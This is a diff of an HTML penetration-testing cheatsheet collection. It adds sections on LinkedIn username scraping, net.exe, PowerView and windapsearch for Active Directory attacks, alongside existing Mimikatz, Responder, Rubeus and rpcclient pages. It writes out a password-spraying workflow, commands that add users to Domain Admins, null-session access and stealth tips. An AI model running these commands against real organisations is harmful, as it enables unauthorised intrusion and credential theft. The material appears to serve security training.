+<tr><td><code>--keyword KEYWORD</code></td><td>Filter by keyword/title</td><td><code>--keyword engineer</code></td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="finding-company-id"><a class="header" href="#finding-company-id">Finding Company ID</a></h2>
+<ol>
+<li>Go to the company’s LinkedIn page</li>
+<li>Click “See all employees”</li>
+<li>The URL will contain the company ID:
+<code>https://www.linkedin.com/search/results/people/?currentCompany=%5B"COMPANY_ID"%5D</code></li>
+</ol>
+<hr>
+<h2 id="usage-examples"><a class="header" href="#usage-examples">Usage Examples</a></h2>
+<h3 id="basic-scrape"><a class="header" href="#basic-scrape">Basic Scrape</a></h3>
+<pre><code class="language-bash">python3 linkedin2username.py -u user@email.com -c 1234
+</code></pre>
+<h3 id="deep-scrape-with-delay"><a class="header" href="#deep-scrape-with-delay">Deep Scrape with Delay</a></h3>
+<pre><code class="language-bash">python3 linkedin2username.py -u user@email.com -c 1234 -n 100 -d 5
+</code></pre>
+<h3 id="filter-by-title"><a class="header" href="#filter-by-title">Filter by Title</a></h3>
+<pre><code class="language-bash">python3 linkedin2username.py -u user@email.com -c 1234 --keyword "IT"
+</code></pre>
+<hr>
+<h2 id="output-files"><a class="header" href="#output-files">Output Files</a></h2>
+<p>The tool generates multiple username format files automatically:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>File</th><th>Format</th><th>Example</th></tr>
+</thead>
+<tbody>
+<tr><td><code>first.last.txt</code></td><td>First.Last</td><td>john.smith</td></tr>
+<tr><td><code>flast.txt</code></td><td>FLast</td><td>jsmith</td></tr>
+<tr><td><code>firstl.txt</code></td><td>FirstL</td><td>johns</td></tr>
+<tr><td><code>first_last.txt</code></td><td>First_Last</td><td>john_smith</td></tr>
+<tr><td><code>rawnames.txt</code></td><td>Full names</td><td>John Smith</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="workflow-for-password-spraying"><a class="header" href="#workflow-for-password-spraying">Workflow for Password Spraying</a></h2>
+<ol>
+<li>Scrape LinkedIn for company employees</li>
+<li>Use generated username lists as input for Kerbrute to validate which users exist in the domain</li>
+<li>Spray validated users with common passwords</li>
+</ol>
+<pre><code class="language-bash">python3 linkedin2username.py -u user@email.com -c 1234
+kerbrute userenum -d domain.local --dc 172.16.5.5 flast.txt
+kerbrute passwordspray -d domain.local --dc 172.16.5.5 valid_users.txt 'Welcome1'
+</code></pre>
+<hr>
+<h2 id="tips-2"><a class="header" href="#tips-2">Tips</a></h2>
+<ul>
+<li>LinkedIn may rate-limit or flag automated scraping — use delays (<code>-d</code>)</li>
+<li>A LinkedIn premium account may return more results</li>
+<li>Combine output with common username wordlists for better coverage</li>
+<li>Always validate generated usernames with Kerbrute before spraying</li>
+</ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="make-files"><a class="header" href="#make-files">Make Files</a></h1>
 <h2 id="why-do-make-files-exist"><a class="header" href="#why-do-make-files-exist">Why do Make files exist?</a></h2>
@@ -2407,7 +2880,7 @@ $(filter-out %.less, $(files))
 <h3 id="includes"><a class="header" href="#includes">Includes</a></h3>
 <pre><code class="language-makefile">-include foo.make
 </code></pre>
-<h3 id="options-1"><a class="header" href="#options-1">Options</a></h3>
+<h3 id="options-2"><a class="header" href="#options-2">Options</a></h3>
 <pre><code class="language-sh">make
   -e, --environment-overrides
   -B, --always-make
@@ -2435,7 +2908,7 @@ endif
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="medusa-cheatsheet"><a class="header" href="#medusa-cheatsheet">Medusa Cheatsheet</a></h1>
 <p>Medusa is a fast, massively parallel, and modular login brute-forcer designed to support a wide array of services that allow remote authentication.</p>
-<h2 id="installation-3"><a class="header" href="#installation-3">Installation</a></h2>
+<h2 id="installation-5"><a class="header" href="#installation-5">Installation</a></h2>
 <pre><code class="language-bash">sudo apt-get -y update
 sudo apt-get -y install medusa
 </code></pre>
@@ -2565,7 +3038,7 @@ search type:exploit platform:windows cve:2021 rank:excellent microsoft
 </tbody>
 </table>
 </div>
-<h3 id="search-options"><a class="header" href="#search-options">Search Options</a></h3>
+<h3 id="search-options-1"><a class="header" href="#search-options-1">Search Options</a></h3>
 <div class="table-wrapper">
 <table>
 <thead>
@@ -3043,7 +3516,7 @@ Jobs
 <p><strong>Note:</strong> Don’t use <code>[CTRL] + [C]</code> to stop an exploit using a port - the port will remain in use. Use <code>jobs -k &lt;id&gt;</code> instead to properly free the port.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="mimikatz-cheatsheet"><a class="header" href="#mimikatz-cheatsheet">Mimikatz Cheatsheet</a></h1>
-<h2 id="basic-syntax-8"><a class="header" href="#basic-syntax-8">Basic Syntax</a></h2>
+<h2 id="basic-syntax-11"><a class="header" href="#basic-syntax-11">Basic Syntax</a></h2>
 <pre><code class="language-cmd">mimikatz.exe "command1" "command2" "exit"
 </code></pre>
 <p>Always start with:</p>
@@ -3538,6 +4011,126 @@ run -j
 <li>&lt;&lt;: Dedent line</li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
+<h1 id="netexe-cheatsheet"><a class="header" href="#netexe-cheatsheet">net.exe Cheatsheet</a></h1>
+<p>Built-in Windows command-line tool for managing network resources, users, groups, and services. Useful when you cannot transfer tools to a target.</p>
+<hr>
+<h2 id="password-policy--account-info"><a class="header" href="#password-policy--account-info">Password Policy / Account Info</a></h2>
+<h3 id="view-domain-password-policy"><a class="header" href="#view-domain-password-policy">View Domain Password Policy</a></h3>
+<pre><code class="language-cmd">net accounts
+net accounts /domain
+</code></pre>
+<p>Key fields: minimum password length, lockout threshold, lockout duration, lockout observation window, password history, max/min password age.</p>
+<hr>
+<h2 id="user-commands"><a class="header" href="#user-commands">User Commands</a></h2>
+<h3 id="list-domain-users"><a class="header" href="#list-domain-users">List Domain Users</a></h3>
+<pre><code class="language-cmd">net user /domain
+</code></pre>
+<h3 id="query-specific-user"><a class="header" href="#query-specific-user">Query Specific User</a></h3>
+<pre><code class="language-cmd">net user jsmith /domain
+</code></pre>
+<h3 id="add-local-user"><a class="header" href="#add-local-user">Add Local User</a></h3>
+<pre><code class="language-cmd">net user newuser Password123! /add
+</code></pre>
+<h3 id="add-domain-user-requires-admin"><a class="header" href="#add-domain-user-requires-admin">Add Domain User (Requires Admin)</a></h3>
+<pre><code class="language-cmd">net user newuser Password123! /add /domain
+</code></pre>
+<h3 id="delete-user"><a class="header" href="#delete-user">Delete User</a></h3>
+<pre><code class="language-cmd">net user olduser /del
+net user olduser /del /domain
+</code></pre>
+<h3 id="change-password"><a class="header" href="#change-password">Change Password</a></h3>
+<pre><code class="language-cmd">net user jsmith NewPass123! /domain
+</code></pre>
+<hr>
+<h2 id="group-commands"><a class="header" href="#group-commands">Group Commands</a></h2>
+<h3 id="list-domain-groups"><a class="header" href="#list-domain-groups">List Domain Groups</a></h3>
+<pre><code class="language-cmd">net group /domain
+</code></pre>
+<h3 id="list-group-members"><a class="header" href="#list-group-members">List Group Members</a></h3>
+<pre><code class="language-cmd">net group "Domain Admins" /domain
+</code></pre>
+<h3 id="add-user-to-group"><a class="header" href="#add-user-to-group">Add User to Group</a></h3>
+<pre><code class="language-cmd">net group "Domain Admins" jsmith /add /domain
+</code></pre>
+<h3 id="list-local-groups"><a class="header" href="#list-local-groups">List Local Groups</a></h3>
+<pre><code class="language-cmd">net localgroup
+</code></pre>
+<h3 id="list-local-group-members"><a class="header" href="#list-local-group-members">List Local Group Members</a></h3>
+<pre><code class="language-cmd">net localgroup Administrators
+</code></pre>
+<h3 id="add-user-to-local-group"><a class="header" href="#add-user-to-local-group">Add User to Local Group</a></h3>
+<pre><code class="language-cmd">net localgroup Administrators jsmith /add
+</code></pre>
+<hr>
+<h2 id="share-commands"><a class="header" href="#share-commands">Share Commands</a></h2>
+<h3 id="list-shares-on-remote-host"><a class="header" href="#list-shares-on-remote-host">List Shares on Remote Host</a></h3>
+<pre><code class="language-cmd">net view \\host
+</code></pre>
+<h3 id="list-all-shares-on-domain"><a class="header" href="#list-all-shares-on-domain">List All Shares on Domain</a></h3>
+<pre><code class="language-cmd">net view /domain
+</code></pre>
+<h3 id="map-a-share"><a class="header" href="#map-a-share">Map a Share</a></h3>
+<pre><code class="language-cmd">net use Z: \\host\share
+</code></pre>
+<h3 id="map-with-credentials"><a class="header" href="#map-with-credentials">Map with Credentials</a></h3>
+<pre><code class="language-cmd">net use Z: \\host\share /user:DOMAIN\user Password123
+</code></pre>
+<h3 id="disconnect-a-share"><a class="header" href="#disconnect-a-share">Disconnect a Share</a></h3>
+<pre><code class="language-cmd">net use Z: /delete
+</code></pre>
+<hr>
+<h2 id="null-session"><a class="header" href="#null-session">Null Session</a></h2>
+<h3 id="establish-null-session"><a class="header" href="#establish-null-session">Establish Null Session</a></h3>
+<pre><code class="language-cmd">net use \\DC01\ipc$ "" /u:""
+</code></pre>
+<h3 id="common-errors-1"><a class="header" href="#common-errors-1">Common Errors</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Error Code</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td>1331</td><td>Account is disabled</td></tr>
+<tr><td>1326</td><td>Incorrect username or password</td></tr>
+<tr><td>1909</td><td>Account is locked out</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="service-commands"><a class="header" href="#service-commands">Service Commands</a></h2>
+<h3 id="list-services"><a class="header" href="#list-services">List Services</a></h3>
+<pre><code class="language-cmd">net start
+</code></pre>
+<h3 id="start--stop-service"><a class="header" href="#start--stop-service">Start / Stop Service</a></h3>
+<pre><code class="language-cmd">net start &lt;service&gt;
+net stop &lt;service&gt;
+</code></pre>
+<hr>
+<h2 id="session--connection-info"><a class="header" href="#session--connection-info">Session / Connection Info</a></h2>
+<h3 id="view-active-sessions"><a class="header" href="#view-active-sessions">View Active Sessions</a></h3>
+<pre><code class="language-cmd">net session
+</code></pre>
+<h3 id="view-current-connections"><a class="header" href="#view-current-connections">View Current Connections</a></h3>
+<pre><code class="language-cmd">net use
+</code></pre>
+<hr>
+<h2 id="time-commands"><a class="header" href="#time-commands">Time Commands</a></h2>
+<h3 id="query-time-on-remote-host"><a class="header" href="#query-time-on-remote-host">Query Time on Remote Host</a></h3>
+<pre><code class="language-cmd">net time \\dc01
+</code></pre>
+<h3 id="sync-time"><a class="header" href="#sync-time">Sync Time</a></h3>
+<pre><code class="language-cmd">net time \\dc01 /set
+</code></pre>
+<hr>
+<h2 id="tips-3"><a class="header" href="#tips-3">Tips</a></h2>
+<ul>
+<li>Always available on Windows — no need to transfer tools</li>
+<li><code>/domain</code> flag targets the domain instead of the local machine</li>
+<li><code>net accounts</code> is the quickest way to check password policy when on a Windows host</li>
+<li>Combine with <code>net view</code> and <code>net use</code> for lateral movement</li>
+<li>Output can be noisy in logs — consider alternatives like PowerView for stealth</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
 <h1 id="netcat-file-transfer"><a class="header" href="#netcat-file-transfer">Netcat File Transfer</a></h1>
 <p>Netcat (often abbreviated to <code>nc</code>) is a computer networking utility for reading from and writing to network connections using TCP or UDP, which means that we can use it for file transfer operations.</p>
 <p>The original Netcat was released by Hobbit in 1995, but it hasn’t been maintained despite its popularity.</p>
@@ -3878,6 +4471,152 @@ $Session = New-PSSession -ComputerName DATABASE01 -Credential $Credential
 <li><code>Test-NetConnection</code>: Test network connectivity to a remote host</li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
+<h1 id="powerview-cheatsheet"><a class="header" href="#powerview-cheatsheet">PowerView Cheatsheet</a></h1>
+<p>PowerShell tool for Active Directory enumeration and exploitation. Part of PowerSploit.</p>
+<ul>
+<li>GitHub: <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></li>
+</ul>
+<hr>
+<h2 id="loading-powerview"><a class="header" href="#loading-powerview">Loading PowerView</a></h2>
+<pre><code class="language-powershell">Import-Module .\PowerView.ps1
+</code></pre>
+<p>Or with execution policy bypass:</p>
+<pre><code class="language-powershell">powershell -ep bypass -c "Import-Module .\PowerView.ps1"
+</code></pre>
+<hr>
+<h2 id="domain-enumeration"><a class="header" href="#domain-enumeration">Domain Enumeration</a></h2>
+<h3 id="domain-info"><a class="header" href="#domain-info">Domain Info</a></h3>
+<pre><code class="language-powershell">Get-Domain
+Get-DomainPolicy
+Get-DomainSID
+</code></pre>
+<h3 id="domain-controllers"><a class="header" href="#domain-controllers">Domain Controllers</a></h3>
+<pre><code class="language-powershell">Get-DomainController
+Get-DomainController -Domain other.local
+</code></pre>
+<h3 id="password-policy"><a class="header" href="#password-policy">Password Policy</a></h3>
+<pre><code class="language-powershell">Get-DomainPolicy
+(Get-DomainPolicy).SystemAccess
+</code></pre>
+<p>Key fields: <code>MinimumPasswordLength</code>, <code>PasswordComplexity</code>, <code>LockoutBadCount</code>, <code>ResetLockoutCount</code>, <code>LockoutDuration</code></p>
+<hr>
+<h2 id="user-enumeration"><a class="header" href="#user-enumeration">User Enumeration</a></h2>
+<h3 id="all-users"><a class="header" href="#all-users">All Users</a></h3>
+<pre><code class="language-powershell">Get-DomainUser
+Get-DomainUser | select samaccountname, description, memberof
+</code></pre>
+<h3 id="specific-user"><a class="header" href="#specific-user">Specific User</a></h3>
+<pre><code class="language-powershell">Get-DomainUser -Identity jsmith
+Get-DomainUser -Identity jsmith -Properties *
+</code></pre>
+<h3 id="users-with-spns-kerberoastable"><a class="header" href="#users-with-spns-kerberoastable">Users with SPNs (Kerberoastable)</a></h3>
+<pre><code class="language-powershell">Get-DomainUser -SPN
+</code></pre>
+<h3 id="users-with-pre-auth-disabled-as-rep-roastable"><a class="header" href="#users-with-pre-auth-disabled-as-rep-roastable">Users with Pre-Auth Disabled (AS-REP Roastable)</a></h3>
+<pre><code class="language-powershell">Get-DomainUser -PreauthNotRequired
+</code></pre>
+<h3 id="admin-count-users"><a class="header" href="#admin-count-users">Admin Count Users</a></h3>
+<pre><code class="language-powershell">Get-DomainUser -AdminCount
+</code></pre>
+<h3 id="search-user-descriptions-for-passwords"><a class="header" href="#search-user-descriptions-for-passwords">Search User Descriptions for Passwords</a></h3>
+<pre><code class="language-powershell">Get-DomainUser | Where-Object {$_.description -ne $null} | select samaccountname, description
+</code></pre>
+<hr>
+<h2 id="group-enumeration"><a class="header" href="#group-enumeration">Group Enumeration</a></h2>
+<h3 id="all-groups"><a class="header" href="#all-groups">All Groups</a></h3>
+<pre><code class="language-powershell">Get-DomainGroup
+</code></pre>
+<h3 id="specific-group-members"><a class="header" href="#specific-group-members">Specific Group Members</a></h3>
+<pre><code class="language-powershell">Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+</code></pre>
+<h3 id="groups-a-user-belongs-to"><a class="header" href="#groups-a-user-belongs-to">Groups a User Belongs To</a></h3>
+<pre><code class="language-powershell">Get-DomainGroup -UserName jsmith
+</code></pre>
+<hr>
+<h2 id="computer-enumeration"><a class="header" href="#computer-enumeration">Computer Enumeration</a></h2>
+<h3 id="all-computers"><a class="header" href="#all-computers">All Computers</a></h3>
+<pre><code class="language-powershell">Get-DomainComputer
+Get-DomainComputer | select dnshostname, operatingsystem
+</code></pre>
+<h3 id="find-computers-with-unconstrained-delegation"><a class="header" href="#find-computers-with-unconstrained-delegation">Find Computers with Unconstrained Delegation</a></h3>
+<pre><code class="language-powershell">Get-DomainComputer -Unconstrained
+</code></pre>
+<h3 id="find-computers-where-current-user-has-local-admin"><a class="header" href="#find-computers-where-current-user-has-local-admin">Find Computers Where Current User Has Local Admin</a></h3>
+<pre><code class="language-powershell">Find-LocalAdminAccess
+</code></pre>
+<hr>
+<h2 id="share-enumeration"><a class="header" href="#share-enumeration">Share Enumeration</a></h2>
+<pre><code class="language-powershell">Find-DomainShare
+Find-DomainShare -CheckShareAccess
+Find-InterestingDomainShareFile
+</code></pre>
+<hr>
+<h2 id="acl-enumeration"><a class="header" href="#acl-enumeration">ACL Enumeration</a></h2>
+<h3 id="find-interesting-acls"><a class="header" href="#find-interesting-acls">Find Interesting ACLs</a></h3>
+<pre><code class="language-powershell">Find-InterestingDomainAcl -ResolveGUIDs
+</code></pre>
+<h3 id="acls-for-specific-object"><a class="header" href="#acls-for-specific-object">ACLs for Specific Object</a></h3>
+<pre><code class="language-powershell">Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
+</code></pre>
+<h3 id="acls-for-current-user"><a class="header" href="#acls-for-current-user">ACLs for Current User</a></h3>
+<pre><code class="language-powershell">Get-DomainObjectAcl -Identity jsmith -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl"}
+</code></pre>
+<hr>
+<h2 id="session--logon-enumeration"><a class="header" href="#session--logon-enumeration">Session / Logon Enumeration</a></h2>
+<h3 id="find-sessions-on-a-computer"><a class="header" href="#find-sessions-on-a-computer">Find Sessions on a Computer</a></h3>
+<pre><code class="language-powershell">Get-NetSession -ComputerName dc01
+</code></pre>
+<h3 id="find-logged-on-users"><a class="header" href="#find-logged-on-users">Find Logged-on Users</a></h3>
+<pre><code class="language-powershell">Get-NetLoggedon -ComputerName dc01
+</code></pre>
+<h3 id="find-where-a-user-is-logged-in"><a class="header" href="#find-where-a-user-is-logged-in">Find Where a User is Logged In</a></h3>
+<pre><code class="language-powershell">Find-DomainUserLocation -Identity admin
+</code></pre>
+<hr>
+<h2 id="trust-enumeration"><a class="header" href="#trust-enumeration">Trust Enumeration</a></h2>
+<pre><code class="language-powershell">Get-DomainTrust
+Get-DomainTrust -Domain other.local
+Get-ForestDomain
+Get-ForestTrust
+</code></pre>
+<hr>
+<h2 id="gpo-enumeration"><a class="header" href="#gpo-enumeration">GPO Enumeration</a></h2>
+<pre><code class="language-powershell">Get-DomainGPO
+Get-DomainGPO -ComputerIdentity dc01
+</code></pre>
+<hr>
+<h2 id="ou-enumeration"><a class="header" href="#ou-enumeration">OU Enumeration</a></h2>
+<pre><code class="language-powershell">Get-DomainOU
+Get-DomainOU | select name, distinguishedname
+</code></pre>
+<hr>
+<h2 id="credential-flags-cross-domain"><a class="header" href="#credential-flags-cross-domain">Credential Flags (Cross-Domain)</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Flag</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-Domain other.local</code></td><td>Target different domain</td></tr>
+<tr><td><code>-Server dc01.other.local</code></td><td>Target specific DC</td></tr>
+<tr><td><code>-Credential $cred</code></td><td>Use alternate credentials</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="using-alternate-credentials"><a class="header" href="#using-alternate-credentials">Using Alternate Credentials</a></h3>
+<pre><code class="language-powershell">$pass = ConvertTo-SecureString 'Password123' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $pass)
+Get-DomainUser -Credential $cred
+</code></pre>
+<hr>
+<h2 id="tips-4"><a class="header" href="#tips-4">Tips</a></h2>
+<ul>
+<li>Pair with BloodHound for visual attack path analysis</li>
+<li><code>Find-LocalAdminAccess</code> can be noisy — scans all domain computers</li>
+<li>Use <code>-Properties</code> to limit returned attributes for faster queries</li>
+<li>SharpView is a .NET port for environments where PowerShell is restricted</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
 <h1 id="ptunnel-ng"><a class="header" href="#ptunnel-ng">ptunnel-ng</a></h1>
 <p>ICMP tunneling tool that encapsulates TCP traffic within ICMP echo request/response packets. Useful when ICMP is allowed but other protocols are blocked.</p>
 <h2 id="install-1"><a class="header" href="#install-1">Install</a></h2>
@@ -3930,7 +4669,7 @@ proxychains nmap -sV -sT &lt;TARGET_IP&gt; -p3389
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="pypykatz-cheatsheet"><a class="header" href="#pypykatz-cheatsheet">pypykatz Cheatsheet</a></h1>
-<h2 id="installation-4"><a class="header" href="#installation-4">Installation</a></h2>
+<h2 id="installation-6"><a class="header" href="#installation-6">Installation</a></h2>
 <pre><code class="language-bash">pip3 install pypykatz
 </code></pre>
 <hr>
@@ -4109,7 +4848,7 @@ pypykatz dpapi credential &lt;cred_file&gt; &lt;guid&gt;:&lt;key_hex&gt;
 </tbody>
 </table>
 </div>
-<h2 id="commands"><a class="header" href="#commands">Commands</a></h2>
+<h2 id="commands-1"><a class="header" href="#commands-1">Commands</a></h2>
 <div class="table-wrapper">
 <table>
 <thead>
@@ -4297,7 +5036,7 @@ pypykatz dpapi credential &lt;cred_file&gt; &lt;guid&gt;:&lt;key_hex&gt;
 <h1 id="responder-cheatsheet"><a class="header" href="#responder-cheatsheet">Responder Cheatsheet</a></h1>
 <p>LLMNR, NBT-NS, and MDNS poisoner for capturing credentials.</p>
 <hr>
-<h2 id="basic-syntax-9"><a class="header" href="#basic-syntax-9">Basic Syntax</a></h2>
+<h2 id="basic-syntax-12"><a class="header" href="#basic-syntax-12">Basic Syntax</a></h2>
 <pre><code class="language-bash">sudo responder -I &lt;interface&gt; [options]
 </code></pre>
 <hr>
@@ -4462,11 +5201,11 @@ HTTP = Off
 <h1 id="rpcclient-cheatsheet"><a class="header" href="#rpcclient-cheatsheet">rpcclient Cheatsheet</a></h1>
 <p>Tool for executing MS-RPC functions on Windows systems.</p>
 <hr>
-<h2 id="basic-syntax-10"><a class="header" href="#basic-syntax-10">Basic Syntax</a></h2>
+<h2 id="basic-syntax-13"><a class="header" href="#basic-syntax-13">Basic Syntax</a></h2>
 <pre><code class="language-bash">rpcclient [options] &lt;server&gt;
 </code></pre>
 <hr>
-<h2 id="connection-options"><a class="header" href="#connection-options">Connection Options</a></h2>
+<h2 id="connection-options-1"><a class="header" href="#connection-options-1">Connection Options</a></h2>
 <div class="table-wrapper">
 <table>
 <thead>
@@ -4483,7 +5222,7 @@ HTTP = Off
 </div>
 <hr>
 <h2 id="connection-examples"><a class="header" href="#connection-examples">Connection Examples</a></h2>
-<h3 id="null-session"><a class="header" href="#null-session">Null Session</a></h3>
+<h3 id="null-session-1"><a class="header" href="#null-session-1">Null Session</a></h3>
 <pre><code class="language-bash">rpcclient -U '' -N 10.10.10.10
 </code></pre>
 <h3 id="with-credentials-2"><a class="header" href="#with-credentials-2">With Credentials</a></h3>
@@ -4526,7 +5265,7 @@ HTTP = Off
 </table>
 </div>
 <hr>
-<h2 id="group-commands"><a class="header" href="#group-commands">Group Commands</a></h2>
+<h2 id="group-commands-1"><a class="header" href="#group-commands-1">Group Commands</a></h2>
 <div class="table-wrapper">
 <table>
 <thead>
@@ -4571,7 +5310,7 @@ HTTP = Off
 </div>
 <hr>
 <h2 id="common-examples-1"><a class="header" href="#common-examples-1">Common Examples</a></h2>
-<h3 id="enumerate-all-users"><a class="header" href="#enumerate-all-users">Enumerate All Users</a></h3>
+<h3 id="enumerate-all-users-1"><a class="header" href="#enumerate-all-users-1">Enumerate All Users</a></h3>
 <pre><code class="language-bash">rpcclient -U '' -N 10.10.10.10 -c 'enumdomusers'
 </code></pre>
 <p>Output format: <code>user:[username] rid:[0xRID]</code></p>
@@ -4582,7 +5321,7 @@ HTTP = Off
 <h3 id="enumerate-groups-2"><a class="header" href="#enumerate-groups-2">Enumerate Groups</a></h3>
 <pre><code class="language-bash">rpcclient -U '' -N 10.10.10.10 -c 'enumdomgroups'
 </code></pre>
-<h3 id="get-password-policy-1"><a class="header" href="#get-password-policy-1">Get Password Policy</a></h3>
+<h3 id="get-password-policy-3"><a class="header" href="#get-password-policy-3">Get Password Policy</a></h3>
 <pre><code class="language-bash">rpcclient -U '' -N 10.10.10.10 -c 'getdompwinfo'
 </code></pre>
 <h3 id="rid-cycling-user-enumeration-1"><a class="header" href="#rid-cycling-user-enumeration-1">RID Cycling (User Enumeration)</a></h3>
@@ -4616,7 +5355,7 @@ rpcclient -U 'admin%Password123' 10.10.10.10 -c 'setuserinfo2 newuser 23 NewPass
 </div>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="rubeus-cheatsheet"><a class="header" href="#rubeus-cheatsheet">Rubeus Cheatsheet</a></h1>
-<h2 id="basic-syntax-11"><a class="header" href="#basic-syntax-11">Basic Syntax</a></h2>
+<h2 id="basic-syntax-14"><a class="header" href="#basic-syntax-14">Basic Syntax</a></h2>
 <pre><code class="language-cmd">Rubeus.exe &lt;command&gt; [options]
 </code></pre>
 <hr>
@@ -4823,11 +5562,11 @@ Rubeus.exe asktgt /user:john /domain:domain.local /rc4:&lt;hash&gt; /ptt
 <h1 id="smbclient-cheatsheet"><a class="header" href="#smbclient-cheatsheet">smbclient Cheatsheet</a></h1>
 <p>SMB/CIFS client for accessing Windows shares from Linux.</p>
 <hr>
-<h2 id="basic-syntax-12"><a class="header" href="#basic-syntax-12">Basic Syntax</a></h2>
+<h2 id="basic-syntax-15"><a class="header" href="#basic-syntax-15">Basic Syntax</a></h2>
 <pre><code class="language-bash">smbclient [options] //server/share
 </code></pre>
 <hr>
-<h2 id="connection-options-1"><a class="header" href="#connection-options-1">Connection Options</a></h2>
+<h2 id="connection-options-2"><a class="header" href="#connection-options-2">Connection Options</a></h2>
 <div class="table-wrapper">
 <table>
 <thead>
@@ -4923,11 +5662,11 @@ domain = MYDOMAIN
 <h1 id="smbmap-cheatsheet"><a class="header" href="#smbmap-cheatsheet">smbmap Cheatsheet</a></h1>
 <p>SMB enumeration tool for listing shares, permissions, and contents.</p>
 <hr>
-<h2 id="basic-syntax-13"><a class="header" href="#basic-syntax-13">Basic Syntax</a></h2>
+<h2 id="basic-syntax-16"><a class="header" href="#basic-syntax-16">Basic Syntax</a></h2>
 <pre><code class="language-bash">smbmap [options] -H &lt;host&gt;
 </code></pre>
 <hr>
-<h2 id="connection-options-2"><a class="header" href="#connection-options-2">Connection Options</a></h2>
+<h2 id="connection-options-3"><a class="header" href="#connection-options-3">Connection Options</a></h2>
 <div class="table-wrapper">
 <table>
 <thead>
@@ -4944,7 +5683,7 @@ domain = MYDOMAIN
 </div>
 <hr>
 <h2 id="authentication-methods"><a class="header" href="#authentication-methods">Authentication Methods</a></h2>
-<h3 id="null-session-1"><a class="header" href="#null-session-1">Null Session</a></h3>
+<h3 id="null-session-2"><a class="header" href="#null-session-2">Null Session</a></h3>
 <pre><code class="language-bash">smbmap -H 10.10.10.10 -u '' -p ''
 </code></pre>
 <h3 id="guest-session"><a class="header" href="#guest-session">Guest Session</a></h3>
@@ -5768,7 +6507,7 @@ SELECT name, sid FROM sys.sql_logins
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="unshadow-cheatsheet"><a class="header" href="#unshadow-cheatsheet">Unshadow Cheatsheet</a></h1>
-<h2 id="basic-syntax-14"><a class="header" href="#basic-syntax-14">Basic Syntax</a></h2>
+<h2 id="basic-syntax-17"><a class="header" href="#basic-syntax-17">Basic Syntax</a></h2>
 <pre><code>unshadow &lt;passwd_file&gt; &lt;shadow_file&gt; &gt; &lt;output_file&gt;
 </code></pre>
 <hr>
@@ -5827,7 +6566,7 @@ htb-student:$y$j9T$abc...:1000:1000:,,,:/home/htb-student:/bin/bash
 </table>
 </div>
 <hr>
-<h2 id="tips"><a class="header" href="#tips">Tips</a></h2>
+<h2 id="tips-5"><a class="header" href="#tips-5">Tips</a></h2>
 <ul>
 <li>John’s <strong>single crack mode</strong> is ideal for unshadowed files as it uses GECOS data (full name, username) to generate candidate passwords</li>
 <li>Always work with copies of system files, not the originals</li>
@@ -5958,6 +6697,91 @@ htb-student:$y$j9T$abc...:1000:1000:,,,:/home/htb-student:/bin/bash
 <h3 id="show-all-tested-wafs"><a class="header" href="#show-all-tested-wafs">Show All Tested WAFs</a></h3>
 <pre><code>wafw00f -a https://example.com
 </code></pre>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="windapsearch-cheatsheet"><a class="header" href="#windapsearch-cheatsheet">windapsearch Cheatsheet</a></h1>
+<p>Python tool for enumerating Active Directory via LDAP queries. Simplifies common AD enumeration tasks.</p>
+<ul>
+<li>GitHub: <a href="https://github.com/ropnop/windapsearch">https://github.com/ropnop/windapsearch</a></li>
+</ul>
+<hr>
+<h2 id="basic-syntax-18"><a class="header" href="#basic-syntax-18">Basic Syntax</a></h2>
+<pre><code class="language-bash">./windapsearch.py [options]
+</code></pre>
+<hr>
+<h2 id="connection-options-4"><a class="header" href="#connection-options-4">Connection Options</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th><th>Example</th></tr>
+</thead>
+<tbody>
+<tr><td><code>--dc-ip IP</code></td><td>Domain Controller IP</td><td><code>--dc-ip 172.16.5.5</code></td></tr>
+<tr><td><code>-d DOMAIN</code></td><td>Domain name</td><td><code>-d domain.local</code></td></tr>
+<tr><td><code>-u USER</code></td><td>Username (blank for anonymous)</td><td><code>-u "admin"</code> or <code>-u ""</code></td></tr>
+<tr><td><code>-p PASS</code></td><td>Password</td><td><code>-p Password123</code></td></tr>
+<tr><td><code>--full</code></td><td>Return full LDAP attributes</td><td></td></tr>
+<tr><td><code>-o FILE</code></td><td>Output to file</td><td><code>-o results.txt</code></td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="enumeration-flags"><a class="header" href="#enumeration-flags">Enumeration Flags</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Flag</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-U</code></td><td>Enumerate all users</td></tr>
+<tr><td><code>-G</code></td><td>Enumerate all groups</td></tr>
+<tr><td><code>-C</code></td><td>Enumerate all computers</td></tr>
+<tr><td><code>-m GROUP</code></td><td>Enumerate members of a group</td></tr>
+<tr><td><code>--da</code></td><td>Enumerate Domain Admins group members</td></tr>
